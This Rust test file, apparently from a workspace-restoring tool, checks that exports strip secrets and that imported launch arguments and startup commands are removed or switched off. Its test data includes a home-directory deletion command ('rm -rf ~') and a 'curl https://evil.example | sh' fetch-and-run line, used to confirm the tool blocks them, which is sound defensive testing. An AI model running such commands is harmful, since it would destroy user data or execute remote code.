//! Tests of the whole import/export flow (unit tests live next to each helper module).
//!
//! The registry used here contains only the generic adapter, so these tests exercise the
//! default `sanitize_for_export` / `locate_query` regardless of how the dedicated adapters
//! evolve; `adapter_overrides_are_respected` covers adapters with their own behaviour.

use std::path::PathBuf;
use std::sync::Arc;

use reframe_platform::mock::MockPlatform;
use reframe_platform::{
    LaunchTarget, LocateQuery, MonitorInfo, OsKind, PackageInfo, PackageKind, PlatformInfo,
    ProcessInfo, Rect, WindowInfo, WindowState,
};
use serde_json::{Value, json};
use uuid::Uuid;

use super::{build_imported_workspace, export_workspace, parse_export, preview_import};
use crate::adapters::generic::GenericAdapter;
use crate::adapters::{
    AdapterRegistry, AppAdapter, AppIdentity, CaptureContext, CaptureInput, CaptureOutput,
    LaunchContext, LaunchStep,
};
use crate::database::Database;
use crate::error::CoreError;
use crate::model::*;
use crate::service::ReframeService;

// ------------------------------------------------------------------------------- helpers

fn adapters() -> AdapterRegistry {
    AdapterRegistry::with_adapters(Vec::new())
}

/// An OS different from the one the tests run on.
fn other_os() -> OsKind {
    if OsKind::current() == OsKind::Windows {
        OsKind::Linux
    } else {
        OsKind::Windows
    }
}

struct Fixture {
    dir: tempfile::TempDir,
}

impl Fixture {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        for sub in ["code/reframe", "code/other", "docs", "bin", "apps"] {
            std::fs::create_dir_all(dir.path().join(sub)).unwrap();
        }
        for file in [
            "bin/editor",
            "bin/code",
            "bin/browser",
            "bin/term",
            "bin/files",
            "bin/music",
            "bin/acme",
            "docs/report.pdf",
            "apps/tool.AppImage",
        ] {
            std::fs::write(dir.path().join(file), b"x").unwrap();
        }
        Self { dir }
    }

    fn path(&self, relative: &str) -> PathBuf {
        self.dir.path().join(relative)
    }
}

fn entry(app_id: &str, name: &str, adapter: &str, executable: PathBuf) -> ApplicationEntry {
    let mut entry = ApplicationEntry::new(app_id, name, adapter);
    entry.launch.executable = Some(executable);
    entry
}

fn window(title: &str, x: i32) -> WindowSnapshot {
    WindowSnapshot {
        title: title.into(),
        class_name: Some("App".into()),
        bounds: Rect::new(x, 40, 1200, 800),
        state: WindowState::Maximized,
        monitor_id: Some("DP-1".into()),
    }
}

fn monitor(id: &str, x: i32) -> MonitorInfo {
    MonitorInfo {
        id: id.into(),
        name: format!("Monitor {id}"),
        bounds: Rect::new(x, 0, 1920, 1080),
        work_area: Rect::new(x, 0, 1920, 1040),
        scale_factor: 1.25,
        is_primary: x == 0,
    }
}

fn tab(url: &str) -> BrowserTab {
    BrowserTab {
        url: url.into(),
        title: format!("Title of {url}"),
        pinned: false,
    }
}

fn session(dir: Option<PathBuf>, command: Option<&str>, approved: bool) -> TerminalSession {
    TerminalSession {
        working_directory: dir,
        profile: Some("Dev".into()),
        startup_command: command.map(str::to_string),
        startup_command_approved: approved,
        window_title: None,
    }
}

fn resolution(name: Option<&str>) -> ImportResolution {
    ImportResolution {
        file_path: "/imports/workspace.json".into(),
        name: name.map(str::to_string),
        app_mappings: Vec::new(),
        path_mappings: Vec::new(),
    }
}

const GITHUB_TOKEN: &str = "ghp_0123456789abcdefghijABCDEFGHIJ012345";

/// A workspace using every `AppState` kind, with secrets in the places users put them.
fn sample_workspace(fx: &Fixture) -> Workspace {
    let mut ws = Workspace::new("  Deep Work  ", "🧠");
    ws.description = "Everything for focused work".into();
    ws.color = Some("#3366FF".into());
    ws.monitors = vec![monitor("DP-1", 0), monitor("HDMI-1", 1920)];
    ws.restore.max_parallel = 2;

    let mut editor = entry("exe:editor", "Editor", "generic", fx.path("bin/editor"));
    editor.state = AppState::Documents {
        documents: vec![DocumentRef {
            path: fx.path("docs/report.pdf"),
            page: Some(2),
        }],
    };
    editor.launch.arguments = vec![
        "--new-window".into(),
        "--token=abc123".into(),
        "--api-key".into(),
        "k3y".into(),
    ];
    editor.launch.working_directory = Some(fx.path("code"));
    editor.windows = vec![window("report.pdf — Editor", 0)];

    let mut ide = entry("exe:code", "Code", "vscode", fx.path("bin/code"));
    ide.state = AppState::Projects {
        projects: vec![ProjectRef {
            path: fx.path("code/reframe"),
            is_workspace_file: false,
            window_title: Some("reframe — Code".into()),
        }],
    };
    ide.windows = vec![window("reframe — Code", 1920)];

    let mut browser = entry("exe:browser", "Browser", "chromium", fx.path("bin/browser"));
    browser.state = AppState::Browser {
        windows: vec![BrowserWindow {
            tabs: vec![
                tab("https://docs.rs/serde"),
                tab("https://app.example.com/cb?code=abc&state=xyz&lang=en"),
                tab("chrome://settings"),
            ],
            active_tab: Some(2),
            window_title: Some("serde - Rust".into()),
        }],
        profile: Some("Default".into()),
    };
    browser.depends_on = vec![editor.id];

    let mut terminal = entry("exe:term", "Terminal", "terminal", fx.path("bin/term"));
    terminal.state = AppState::Terminal {
        sessions: vec![session(
            Some(fx.path("code/reframe")),
            Some(&format!(
                "export GITHUB_TOKEN={GITHUB_TOKEN} && npm run dev"
            )),
            true,
        )],
    };
    terminal.depends_on = vec![ide.id, editor.id];

    let mut files = entry("exe:files", "Files", "file_manager", fx.path("bin/files"));
    files.state = AppState::Folders {
        folders: vec![FolderRef {
            path: fx.path("docs"),
            window_title: Some("docs".into()),
        }],
    };
    files.enabled = false;

    let mut music = entry("exe:music", "Music", "music", fx.path("bin/music"));
    music.state = AppState::Media {
        uri: Some("spotify:playlist:37i9dQZF1DXcBWIGoYBM5M".into()),
        label: Some("Deep Focus".into()),
    };
    music.options = EntryOptions {
        delay_after_launch_ms: Some(500),
        timeout_ms: Some(5_000),
        retry_count: Some(2),
        restore_window_positions: false,
    };

    let mut custom = entry("exe:acme", "Acme", "acme", fx.path("bin/acme"));
    custom.state = AppState::Custom {
        data: json!({ "apiKey": "secret-value", "layout": "grid" }),
    };

    let mut packaged = ApplicationEntry::new("pkg:tool", "Tool", "generic");
    packaged.launch.package = Some(PackageInfo {
        kind: PackageKind::AppImage,
        id: "tool".into(),
        path: Some(fx.path("apps/tool.AppImage")),
    });

    ws.applications = vec![
        editor, ide, browser, terminal, files, music, custom, packaged,
    ];
    ws
}

// ---------------------------------------------------------------------------- round trip

#[test]
fn round_trip_export_json_parse_preview_build() {
    let fx = Fixture::new();
    let ws = sample_workspace(&fx);
    ws.validate().unwrap();
    let adapters = adapters();
    let platform = MockPlatform::new();

    let export = export_workspace(&ws, &adapters, OsKind::current(), "1.2.3").unwrap();
    assert_eq!(export.format, EXPORT_FORMAT);
    assert_eq!(export.version, EXPORT_VERSION);
    assert_eq!(export.app_version, "1.2.3");
    assert_eq!(export.workspace.name, "Deep Work");
    assert_eq!(export.machine.os, OsKind::current());
    assert_eq!(export.machine.monitors, ws.monitors);
    assert_eq!(export.machine.applications.len(), ws.applications.len());

    let json = serde_json::to_string_pretty(&export).unwrap();
    for secret in [
        "ghp_",
        "abc123",
        "--token",
        "--api-key",
        "k3y",
        "secret-value",
        "code=abc",
        "state=xyz",
        "chrome://",
    ] {
        assert!(!json.contains(secret), "the export contains {secret:?}");
    }

    let parsed = parse_export(json.as_bytes()).unwrap();
    assert_eq!(parsed, export);

    let preview = preview_import(&parsed, "/imports/deep-work.json", &platform, &adapters).unwrap();
    assert_eq!(preview.file_path, "/imports/deep-work.json");
    assert_eq!(preview.name, "Deep Work");
    assert_eq!(preview.source_os, OsKind::current());
    assert_eq!(preview.applications.len(), ws.applications.len());
    for app in &preview.applications {
        assert!(
            matches!(app.resolution, AppResolution::Exported { .. }),
            "{} should resolve to its exported target: {:?}",
            app.display_name,
            app.resolution
        );
        assert!(app.missing_paths.is_empty(), "{:?}", app.missing_paths);
    }
    assert!(preview.suggested_path_mappings.is_empty());
    assert!(preview.warnings.iter().any(|w| w
        == "1 startup command was imported switched off — review it before enabling"));
    assert!(preview.warnings.iter().any(|w| w
        == "Custom launch arguments were removed for safety: Editor: --new-window; add them \
            again in the workspace editor if you trust them"));

    let imported =
        build_imported_workspace(&parsed, &resolution(None), &platform, &adapters).unwrap();
    imported.validate().unwrap();
    assert_ne!(imported.id, ws.id);
    assert_eq!(imported.name, "Deep Work");
    assert_eq!(imported.description, ws.description);
    assert_eq!(imported.icon, ws.icon);
    assert_eq!(imported.color, ws.color);
    assert_eq!(imported.monitors, ws.monitors);
    assert_eq!(imported.restore, ws.restore);
    assert_eq!(imported.schema_version, WORKSPACE_SCHEMA_VERSION);
    assert_eq!(imported.last_restored_at, None);
    assert_eq!(imported.applications.len(), ws.applications.len());

    for (original, new) in ws.applications.iter().zip(&imported.applications) {
        assert_ne!(new.id, original.id);
        assert_eq!(new.app_id, original.app_id);
        assert_eq!(new.display_name, original.display_name);
        assert_eq!(new.adapter_id, original.adapter_id);
        assert_eq!(new.enabled, original.enabled);
        assert!(
            new.launch.arguments.is_empty(),
            "imported arguments are never applied"
        );
        assert_eq!(new.windows, original.windows);
        assert_eq!(new.options, original.options);
        assert_eq!(new.launch.executable, original.launch.executable);
        assert_eq!(new.launch.package, original.launch.package);
        assert_eq!(
            new.launch.working_directory,
            original.launch.working_directory
        );
    }
    let ids: Vec<Uuid> = imported.applications.iter().map(|a| a.id).collect();
    let [
        editor,
        ide,
        browser,
        terminal,
        files,
        music,
        custom,
        packaged,
    ] = imported.applications.as_slice()
    else {
        panic!("unexpected application count");
    };
    // Exported (sanitized) so the preview can show them, but not applied.
    assert_eq!(
        parsed.workspace.applications[0].arguments,
        vec!["--new-window".to_string()]
    );
    assert!(editor.launch.arguments.is_empty());
    assert_eq!(browser.depends_on, vec![ids[0]]);
    assert_eq!(terminal.depends_on, vec![ids[1], ids[0]]);
    assert_eq!(editor.state, ws.applications[0].state);
    assert_eq!(ide.state, ws.applications[1].state);
    assert_eq!(
        browser.state,
        AppState::Browser {
            windows: vec![BrowserWindow {
                // The second title showed the address: its secrets are removed too.
                tabs: vec![
                    tab("https://docs.rs/serde"),
                    tab("https://app.example.com/cb?lang=en"),
                ],
                active_tab: Some(1),
                window_title: Some("serde - Rust".into()),
            }],
            profile: Some("Default".into()),
        }
    );
    assert_eq!(
        terminal.state,
        AppState::Terminal {
            sessions: vec![session(
                Some(fx.path("code/reframe")),
                Some("export GITHUB_TOKEN=\"<redacted>\" && npm run dev"),
                false,
            )],
        }
    );
    assert_eq!(files.state, ws.applications[4].state);
    assert!(!files.enabled);
    assert_eq!(music.state, ws.applications[5].state);
    assert_eq!(custom.state, AppState::None);
    assert_eq!(packaged.launch.executable, None);
    assert!(packaged.launch.package.is_some());
}

/// An adapter with its own export sanitizing and locate query.
struct AcmeAdapter;

impl AppAdapter for AcmeAdapter {
    fn id(&self) -> &'static str {
        "acme"
    }

    fn name(&self) -> &'static str {
        "Acme"
    }

    fn identify(&self, _process: &ProcessInfo, _windows: &[&WindowInfo]) -> Option<AppIdentity> {
        None
    }

    fn capability(&self, info: &PlatformInfo) -> AdapterCapability {
        GenericAdapter::new().capability(info)
    }

    fn capture(&self, ctx: &CaptureContext<'_>, input: &CaptureInput<'_>) -> CaptureOutput {
        GenericAdapter::new().capture(ctx, input)
    }

    fn launch_plan(
        &self,
        ctx: &LaunchContext<'_>,
        entry: &ApplicationEntry,
    ) -> Result<Vec<LaunchStep>, String> {
        GenericAdapter::new().launch_plan(ctx, entry)
    }

    fn describe(&self, _state: &AppState) -> Vec<StateDetail> {
        Vec::new()
    }

    fn locate_query(&self, _app_id: &str) -> LocateQuery {
        LocateQuery {
            executable_names: vec!["acme-studio".into()],
            ..LocateQuery::default()
        }
    }

    fn sanitize_for_export(&self, state: &AppState) -> AppState {
        match state {
            AppState::Custom { data } => AppState::Custom {
                data: json!({ "layout": data["layout"].clone() }),
            },
            other => super::sanitize::sanitize_state(other),
        }
    }
}

#[test]
fn adapter_overrides_are_respected() {
    let fx = Fixture::new();
    let adapters = AdapterRegistry::with_adapters(vec![Arc::new(AcmeAdapter)]);
    let mut ws = Workspace::new("Acme", "🅰️");
    let mut app = entry("acme", "Acme Studio", "acme", fx.path("bin/acme"));
    app.state = AppState::Custom {
        data: json!({ "apiKey": "secret-value", "layout": "grid" }),
    };
    ws.applications = vec![app];

    let export = export_workspace(&ws, &adapters, other_os(), "test").unwrap();
    assert_eq!(
        export.workspace.applications[0].state,
        AppState::Custom {
            data: json!({ "layout": "grid" })
        }
    );
    let json = serde_json::to_vec(&export).unwrap();
    let parsed = parse_export(&json).unwrap();

    let platform = MockPlatform::new();
    let target = LaunchTarget::Executable {
        path: "/opt/acme/acme-studio".into(),
    };
    platform.install("acme-studio", target.clone());
    let preview = preview_import(&parsed, "x.json", &platform, &adapters).unwrap();
    assert_eq!(
        preview.applications[0].resolution,
        AppResolution::Found { target }
    );
    let imported =
        build_imported_workspace(&parsed, &resolution(None), &platform, &adapters).unwrap();
    assert_eq!(
        imported.applications[0].launch.executable,
        Some(PathBuf::from("/opt/acme/acme-studio"))
    );
    assert_eq!(
        imported.applications[0].state,
        AppState::Custom {
            data: json!({ "layout": "grid" })
        }
    );
}

#[test]
fn export_refuses_what_cannot_be_imported() {
    let mut ws = Workspace::new("Too much", "🧪");
    let mut app = ApplicationEntry::new("exe:x", "X", "generic");
    app.launch.arguments = (0..40).map(|i| format!("--flag-{i}")).collect();
    ws.applications = vec![app];
    let error = export_workspace(&ws, &adapters(), OsKind::Linux, "test").unwrap_err();
    let CoreError::Validation(problems) = error else {
        panic!("expected a validation error, got {error:?}");
    };
    assert!(problems[0].starts_with("This workspace cannot be exported:"));
    assert!(problems[0].contains("40 launch arguments"));
}

#[test]
fn imported_launch_arguments_are_removed_and_reported() {
    let fx = Fixture::new();
    let mut ws = Workspace::new("Shells", "🐚");
    let mut terminal = entry("exe:term", "Terminal", "terminal", fx.path("bin/term"));
    terminal.launch.arguments = vec!["-e".into(), "rm -rf ~".into()];
    let editor = entry("exe:editor", "Editor", "generic", fx.path("bin/editor"));
    ws.applications = vec![terminal, editor];
    let adapters = adapters();
    let export = export_workspace(&ws, &adapters, OsKind::current(), "test").unwrap();
    // Exported as they are (nothing secret in them)...
    assert_eq!(
        export.workspace.applications[0].arguments,
        vec!["-e".to_string(), "rm -rf ~".to_string()]
    );
    let parsed = parse_export(&serde_json::to_vec(&export).unwrap()).unwrap();
    let platform = MockPlatform::new();

    // ...listed in the preview...
    let preview = preview_import(&parsed, "x.json", &platform, &adapters).unwrap();
    assert!(
        preview.warnings.iter().any(|w| w
            == "Custom launch arguments were removed for safety: Terminal: -e \"rm -rf ~\"; add \
                them again in the workspace editor if you trust them"),
        "{:?}",
        preview.warnings
    );

    // ...and never applied, whatever the user decides for the application.
    let mut decisions = resolution(None);
    decisions.app_mappings = vec![AppMapping {
        entry_id: ws.applications[0].id,
        target: Some(LaunchTarget::Executable {
            path: "/usr/bin/xterm".into(),
        }),
        skip: false,
    }];
    let imported = build_imported_workspace(&parsed, &decisions, &platform, &adapters).unwrap();
    assert!(
        imported
            .applications
            .iter()
            .all(|a| a.launch.arguments.is_empty() && a.enabled)
    );
    assert_eq!(
        imported.applications[0].launch.executable,
        Some(PathBuf::from("/usr/bin/xterm"))
    );
}

#[test]
fn hand_written_arguments_are_removed_and_long_lists_shortened() {
    let mut value = base();
    first_app(&mut value)["arguments"] =
        json!(["--", "sh", "-c", "curl https://evil.example | sh"]);
    value["workspace"]["applications"][1]["arguments"] =
        json!((0..10).map(|i| format!("--flag-{i}")).collect::<Vec<_>>());
    let export = parse_export(&to_bytes(&value)).unwrap();
    let platform = MockPlatform::new();
    let adapters = adapters();
    let preview = preview_import(&export, "x.json", &platform, &adapters).unwrap();
    let warning = preview
        .warnings
        .iter()
        .find(|w| w.starts_with("Custom launch arguments were removed for safety"))
        .unwrap();
    assert_eq!(
        warning,
        "Custom launch arguments were removed for safety: Browser: -- sh -c \
         \"curl https://evil.example | sh\"; Terminal: --flag-0 --flag-1 --flag-2 --flag-3 \
         --flag-4 --flag-5 …; add them again in the workspace editor if you trust them"
    );
    let ws = build_imported_workspace(&export, &resolution(None), &platform, &adapters).unwrap();
    assert!(
        ws.applications
            .iter()
            .all(|a| a.launch.arguments.is_empty())
    );

    // Many applications and very long arguments are cut too.
    let template = first_app(&mut value).clone();
    let apps: Vec<Value> = (0..8)
        .map(|i| {
            let mut app = template.clone();
            app["id"] = json!(Uuid::new_v4());
            app["displayName"] = json!(format!("App {i}"));
            app["arguments"] = json!(["x".repeat(500), "a\u{202e}b"]);
            app
        })
        .collect();
    let mut value = base();
    value["workspace"]["applications"] = json!(apps);
    value["machine"]["applications"] = json!([]);
    let export = parse_export(&to_bytes(&value)).unwrap();
    let preview = preview_import(&export, "x.json", &platform, &adapters).unwrap();
    let warning = preview
        .warnings
        .iter()
        .find(|w| w.starts_with("Custom launch arguments were removed for safety"))
        .unwrap();
    assert!(warning.contains(&format!("App 0: {}… \"a\\u{{202e}}b\"", "x".repeat(60))));
    assert!(warning.contains("App 4:") && !warning.contains("App 5:"));
    assert!(warning.contains("; and 3 more applications; add them again"));
}

// ------------------------------------------------------------------------------- preview

#[test]
fn preview_resolves_exported_found_and_unresolved_applications() {
    let fx = Fixture::new();
    let mut ws = Workspace::new("Mixed", "🧩");
    let exported = entry("exe:editor", "Editor", "generic", fx.path("bin/editor"));
    let found = entry(
        "exe:gimp",
        "GIMP",
        "generic",
        "/nonexistent/bin/gimp".into(),
    );
    let unresolved = entry(
        "exe:nothing",
        "Nothing",
        "generic",
        "/nonexistent/nothing".into(),
    );
    let by_file_name = entry(
        "pkg:org.example.viewer",
        "Viewer",
        "generic",
        "/old/place/Viewer".into(),
    );
    let mut packaged = ApplicationEntry::new("pkg:tool", "Tool", "generic");
    let package = PackageInfo {
        kind: PackageKind::AppImage,
        id: "tool".into(),
        path: Some(fx.path("apps/tool.AppImage")),
    };
    packaged.launch.package = Some(package.clone());
    ws.applications = vec![exported, found, unresolved, by_file_name, packaged];
    let adapters = adapters();
    let export = export_workspace(&ws, &adapters, OsKind::current(), "test").unwrap();

    let platform = MockPlatform::new();
    let gimp = LaunchTarget::Executable {
        path: "/usr/bin/gimp".into(),
    };
    let gimp_flatpak = LaunchTarget::Package {
        package: PackageInfo {
            kind: PackageKind::Flatpak,
            id: "org.gimp.GIMP".into(),
            path: None,
        },
    };
    platform.install("gimp", gimp.clone());
    platform.install("gimp", gimp_flatpak.clone());
    platform.install("gimp", gimp.clone());
    platform.install(
        "gimp",
        LaunchTarget::Open {
            target: "gimp.desktop".into(),
        },
    );
    let viewer = LaunchTarget::Executable {
        path: "/usr/local/bin/viewer".into(),
    };
    platform.install("viewer", viewer.clone());

    let preview = preview_import(&export, "mixed.json", &platform, &adapters).unwrap();
    let apps = &preview.applications;
    assert_eq!(
        apps[0].resolution,
        AppResolution::Exported {
            target: LaunchTarget::Executable {
                path: fx.path("bin/editor")
            }
        }
    );
    assert_eq!(apps[1].resolution, AppResolution::Found { target: gimp });
    assert_eq!(
        apps[1].alternatives,
        vec![gimp_flatpak],
        "deduplicated, no open targets"
    );
    assert_eq!(apps[2].resolution, AppResolution::Unresolved);
    assert!(apps[2].alternatives.is_empty());
    assert_eq!(apps[3].resolution, AppResolution::Found { target: viewer });
    assert_eq!(
        apps[4].resolution,
        AppResolution::Exported {
            target: LaunchTarget::Package { package }
        }
    );
    assert!(preview.warnings.iter().any(|w| w
        == "1 application could not be found on this computer — choose its executable or skip it"));
    assert!(!preview.warnings.iter().any(|w| w.contains("exported on")));
}

#[test]
fn preview_from_another_os_searches_this_machine() {
    let fx = Fixture::new();
    let mut ws = Workspace::new("Elsewhere", "🌍");
    // The executable exists here, but the export comes from another OS: never trusted as is.
    ws.applications = vec![entry(
        "exe:editor",
        "Editor",
        "generic",
        fx.path("bin/editor"),
    )];
    let adapters = adapters();
    let export = export_workspace(&ws, &adapters, other_os(), "test").unwrap();

    let platform = MockPlatform::new();
    let preview = preview_import(&export, "x.json", &platform, &adapters).unwrap();
    assert_eq!(preview.source_os, other_os());
    assert_eq!(
        preview.applications[0].resolution,
        AppResolution::Unresolved
    );
    assert!(
        preview
            .warnings
            .iter()
            .any(|w| w.starts_with("This workspace was exported on"))
    );

    let installed = LaunchTarget::Executable {
        path: "/usr/bin/editor".into(),
    };
    platform.install("editor", installed.clone());
    let preview = preview_import(&export, "x.json", &platform, &adapters).unwrap();
    assert_eq!(
        preview.applications[0].resolution,
        AppResolution::Found { target: installed }
    );
}

#[cfg(unix)]
#[test]
fn preview_lists_missing_paths_and_review_warnings() {
    let mut ws = Workspace::new("From Windows", "🪟");
    let mut writer = ApplicationEntry::new("exe:winword", "Word", "generic");
    writer.launch.executable = Some(r"C:\Program Files\Microsoft Office\WINWORD.EXE".into());
    writer.launch.working_directory = Some(r"C:\Users\alice\Documents".into());
    writer.state = AppState::Documents {
        documents: vec![
            DocumentRef {
                path: r"C:\Users\alice\Documents\plan.docx".into(),
                page: None,
            },
            DocumentRef {
                path: r"C:\Users\alice\Documents\plan.docx".into(),
                page: Some(3),
            },
        ],
    };
    let mut terminal = ApplicationEntry::new("exe:wt", "Windows Terminal", "terminal");
    terminal.state = AppState::Terminal {
        sessions: vec![
            session(
                Some(r"C:\Users\alice\code".into()),
                Some("npm run dev"),
                true,
            ),
            session(None, Some("cargo watch -x test"), true),
            session(None, None, false),
        ],
    };
    ws.applications = vec![writer, terminal];
    let adapters = adapters();
    let export = export_workspace(&ws, &adapters, OsKind::Windows, "test").unwrap();

    let platform = MockPlatform::new();
    let preview = preview_import(&export, "x.json", &platform, &adapters).unwrap();
    assert_eq!(
        preview.applications[0].missing_paths,
        vec![
            PathBuf::from(r"C:\Users\alice\Documents\plan.docx"),
            PathBuf::from(r"C:\Users\alice\Documents"),
        ]
    );
    assert_eq!(
        preview.applications[1].missing_paths,
        vec![PathBuf::from(r"C:\Users\alice\code")]
    );
    let warnings = &preview.warnings;
    assert!(
        warnings
            .iter()
            .any(|w| w.starts_with("This workspace was exported on Windows"))
    );
    assert!(warnings.iter().any(|w| w
        == "2 applications could not be found on this computer — choose their executables or skip them"));
    assert!(warnings.iter().any(
        |w| w == "2 startup commands were imported switched off — review them before enabling"
    ));
    assert!(warnings.iter().any(|w| {
        w.starts_with("3 folders or files used by this workspace do not exist on this computer")
    }));
}

// --------------------------------------------------------------------------------- build

#[cfg(unix)]
#[test]
fn build_applies_skips_overrides_mappings_and_remaps_dependencies() {
    let fx = Fixture::new();
    let mut ws = Workspace::new("Windows work", "🪟");
    let alpha = ApplicationEntry::new("exe:alpha", "Alpha", "generic");
    let mut beta = ApplicationEntry::new("exe:beta", "Beta", "generic");
    beta.depends_on = vec![alpha.id];
    beta.launch.executable = Some(r"C:\Apps\beta.exe".into());
    beta.launch.working_directory = Some(r"C:\Users\alice\code".into());
    beta.state = AppState::Projects {
        projects: vec![ProjectRef {
            path: r"C:\Users\Alice\code\reframe".into(),
            is_workspace_file: false,
            window_title: None,
        }],
    };
    let mut gamma = ApplicationEntry::new("exe:gamma", "Gamma", "terminal");
    gamma.depends_on = vec![alpha.id, beta.id, beta.id];
    gamma.launch.working_directory = Some(r"C:\Users\alice\missing".into());
    gamma.state = AppState::Terminal {
        sessions: vec![session(
            Some(r"c:/users/alice/code".into()),
            Some("npm test"),
            true,
        )],
    };
    let mut delta = ApplicationEntry::new("exe:delta", "Delta", "file_manager");
    delta.depends_on = vec![gamma.id];
    delta.state = AppState::Folders {
        folders: vec![FolderRef {
            path: r"D:\data\photos".into(),
            window_title: None,
        }],
    };
    ws.applications = vec![alpha.clone(), beta.clone(), gamma.clone(), delta.clone()];
    let adapters = adapters();
    let mut export = export_workspace(&ws, &adapters, OsKind::Windows, "test").unwrap();
    // A hand-edited file claiming approval must not switch the command on.
    if let AppState::Terminal { sessions } = &mut export.workspace.applications[2].state {
        sessions[0].startup_command_approved = true;
    }

    let platform = MockPlatform::new();
    platform.install(
        "gamma",
        LaunchTarget::Executable {
            path: "/usr/bin/gamma".into(),
        },
    );
    let decisions = ImportResolution {
        file_path: "x.json".into(),
        name: Some("  Imported Work  ".into()),
        app_mappings: vec![
            AppMapping {
                entry_id: alpha.id,
                target: None,
                skip: true,
            },
            AppMapping {
                entry_id: beta.id,
                target: Some(LaunchTarget::Executable {
                    path: "/opt/beta/beta".into(),
                }),
                skip: false,
            },
            // Unknown entries are ignored.
            AppMapping {
                entry_id: Uuid::new_v4(),
                target: None,
                skip: true,
            },
        ],
        path_mappings: vec![PathMapping {
            from_prefix: r"C:\Users\alice\".into(),
            to_prefix: fx.dir.path().display().to_string(),
        }],
    };
    let imported = build_imported_workspace(&export, &decisions, &platform, &adapters).unwrap();
    assert_eq!(imported.name, "Imported Work");
    let [b, g, d] = imported.applications.as_slice() else {
        panic!("alpha must be skipped: {:?}", imported.applications);
    };
    let original_ids = [alpha.id, beta.id, gamma.id, delta.id];
    assert!(
        imported
            .applications
            .iter()
            .all(|a| !original_ids.contains(&a.id))
    );
    assert_eq!(b.display_name, "Beta");
    assert!(
        b.depends_on.is_empty(),
        "the dependency on a skipped app is removed"
    );
    assert_eq!(g.depends_on, vec![b.id], "remapped and deduplicated");
    assert_eq!(d.depends_on, vec![g.id]);

    assert_eq!(b.launch.executable, Some(PathBuf::from("/opt/beta/beta")));
    assert_eq!(b.launch.package, None);
    assert_eq!(g.launch.executable, Some(PathBuf::from("/usr/bin/gamma")));
    assert_eq!(d.launch.executable, None, "unresolved and not skipped");

    assert_eq!(b.launch.working_directory, Some(fx.path("code")));
    assert_eq!(
        g.launch.working_directory, None,
        "still missing after mapping"
    );
    assert_eq!(
        b.state,
        AppState::Projects {
            projects: vec![ProjectRef {
                path: fx.path("code/reframe"),
                is_workspace_file: false,
                window_title: None,
            }],
        }
    );
    assert_eq!(
        g.state,
        AppState::Terminal {
            sessions: vec![session(Some(fx.path("code")), Some("npm test"), false)],
        }
    );
    assert_eq!(d.state, delta.state, "no mapping applies");
}

#[test]
fn build_rejects_invalid_decisions() {
    let mut ws = Workspace::new("Small", "🧪");
    let app = ApplicationEntry::new("exe:x", "X", "generic");
    let id = app.id;
    ws.applications = vec![app];
    let adapters = adapters();
    let export = export_workspace(&ws, &adapters, OsKind::current(), "test").unwrap();
    let platform = MockPlatform::new();

    let mut decisions = resolution(None);
    decisions.app_mappings = vec![AppMapping {
        entry_id: id,
        target: Some(LaunchTarget::Open {
            target: "https://example.com".into(),
        }),
        skip: false,
    }];
    let error = build_imported_workspace(&export, &decisions, &platform, &adapters).unwrap_err();
    assert!(matches!(error, CoreError::Validation(_)), "{error:?}");

    let mut decisions = resolution(None);
    decisions.path_mappings = vec![PathMapping {
        from_prefix: "  ".into(),
        to_prefix: "/home/bob".into(),
    }];
    let error = build_imported_workspace(&export, &decisions, &platform, &adapters).unwrap_err();
    assert!(matches!(error, CoreError::Validation(_)), "{error:?}");

    let error = build_imported_workspace(
        &export,
        &resolution(Some(&"n".repeat(81))),
        &platform,
        &adapters,
    )
    .unwrap_err();
    assert!(matches!(error, CoreError::Validation(_)), "{error:?}");

    // A blank name keeps the exported one.
    let ws =
        build_imported_workspace(&export, &resolution(Some("   ")), &platform, &adapters).unwrap();
    assert_eq!(ws.name, "Small");

    // Skipping everything is allowed.
    let mut decisions = resolution(None);
    decisions.app_mappings = vec![AppMapping {
        entry_id: id,
        target: None,
        skip: true,
    }];
    let ws = build_imported_workspace(&export, &decisions, &platform, &adapters).unwrap();
    assert!(ws.applications.is_empty());
}

#[test]
fn build_revalidates_the_export() {
    let mut ws = Workspace::new("Small", "🧪");
    ws.applications = vec![ApplicationEntry::new("exe:x", "X", "generic")];
    let adapters = adapters();
    let mut export = export_workspace(&ws, &adapters, OsKind::current(), "test").unwrap();
    export.workspace.applications[0].depends_on = vec![Uuid::new_v4()];
    let platform = MockPlatform::new();
    assert!(matches!(
        build_imported_workspace(&export, &resolution(None), &platform, &adapters),
        Err(CoreError::InvalidImport(_))
    ));
    assert!(matches!(
        preview_import(&export, "x.json", &platform, &adapters),
        Err(CoreError::InvalidImport(_))
    ));
}

// ------------------------------------------------------------------------------- parsing

fn small_export() -> WorkspaceExport {
    let mut ws = Workspace::new("Small", "🧪");
    let mut a = ApplicationEntry::new("exe:browser", "Browser", "chromium");
    a.launch.executable = Some("/usr/bin/browser".into());
    a.state = AppState::Browser {
        windows: vec![BrowserWindow {
            tabs: vec![tab("https://example.com/")],
            active_tab: Some(0),
            window_title: None,
        }],
        profile: None,
    };
    a.windows = vec![window("Example", 0)];
    a.launch.arguments = vec!["--new-window".into()];
    let mut b = ApplicationEntry::new("exe:term", "Terminal", "terminal");
    b.depends_on = vec![a.id];
    b.state = AppState::Terminal {
        sessions: vec![session(Some("/home/a".into()), Some("htop"), false)],
    };
    b.launch.working_directory = Some("/home/a".into());
    ws.applications = vec![a, b];
    ws.monitors = vec![monitor("M1", 0)];
    export_workspace(&ws, &adapters(), OsKind::Linux, "test").unwrap()
}

/// A fresh valid document (new ids and timestamp on every call).
fn base() -> Value {
    serde_json::to_value(small_export()).unwrap()
}

fn to_bytes(value: &Value) -> Vec<u8> {
    serde_json::to_vec_pretty(value).unwrap()
}

fn rejection(bytes: &[u8]) -> String {
    match parse_export(bytes) {
        Err(CoreError::InvalidImport(message)) => message,
        other => panic!("expected an invalid import, got {other:?}"),
    }
}

fn assert_rejected(value: &Value, needle: &str) {
    let message = rejection(&to_bytes(value));
    assert!(
        message.contains(needle),
        "{message:?} should mention {needle:?}"
    );
}

/// An edit that makes a valid document invalid.
type Mutation = fn(&mut Value);

fn first_app(value: &mut Value) -> &mut Value {
    &mut value["workspace"]["applications"][0]
}

#[test]
fn parse_accepts_its_own_exports_and_ignores_unknown_fields() {
    let export = small_export();
    let original = serde_json::to_value(&export).unwrap();
    assert_eq!(parse_export(&to_bytes(&original)).unwrap(), export);

    let mut value = original.clone();
    value["futureField"] = json!(1);
    value["machine"]["gpu"] = json!({ "vendor": "x" });
